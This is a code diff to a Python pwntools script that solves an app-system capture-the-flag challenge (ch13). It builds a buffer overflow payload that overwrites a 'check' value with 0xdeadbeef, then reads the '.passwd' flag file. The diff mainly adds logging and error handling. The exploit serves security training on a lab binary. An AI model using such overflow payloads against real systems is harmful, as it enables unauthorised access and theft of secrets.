@@ -13,16 +13,21 @@ PASS = 'app-systeme-ch13'
 BINARY_PATH = "/challenge/app-systeme/ch13/ch13"
 LOCAL_COPY  = "/tmp/ch13"
 
-
 def send_and_print(shell, cmd, timeout=10):
     if isinstance(cmd, bytes):
         display = cmd.decode(errors='replace')
     else:
         display = cmd
 
-    print(f"[HOST] $ {display}")
+    log.info(f"[HOST] $ {display}")
 
-    shell.sendline(cmd)
+    try:
+        shell.sendline(cmd)
+    except (OSError, EOFError) as e:
+        log.failure(e)
+        log.failure(f"unable to send command via socket: {cmd}")
+        shell.close()
+        sys.exit(1)
 
     output = b''
 
@@ -34,6 +39,7 @@ def send_and_print(shell, cmd, timeout=10):
         except TimeoutError:
             continue
         except EOFError:
+            log.failure("unable to send command via socket")
             break
 
     if output:
@@ -97,9 +103,9 @@ def main():
 
     offset = find_check_offset(conn)
 
-    payload = b'A' * offset + p32(0xdeadbeef)
+    payload = b'A' * offset + p32(0xdeadbeef, endianness="little")
 
-    io = conn.process([BINARY_PATH, ])
+    io = conn.process([BINARY_PATH, payload])
     io.sendline(payload)
 
     time.sleep(2)
@@ -108,13 +114,14 @@ def main():
 
     m = re.search(r'\[check\]\s+(0x[0-9a-fA-F]+)', out)
     if m:
-        log.info(f"[+] Overwritten `check` address/value: {m.group(1)}")
+        log.info(f"Overwritten `check` address/value: {m.group(1)}")
     else:
-        log.failure("[-] Didn't see the [check] line in output")
+        log.failure("Didn't see the [check] line in output")
 
-    io.interactive()
+    send_and_print(io, "cat .passwd", timeout=5)
     io.close()
     conn.close()
 
 if __name__ == '__main__':
     main()
+
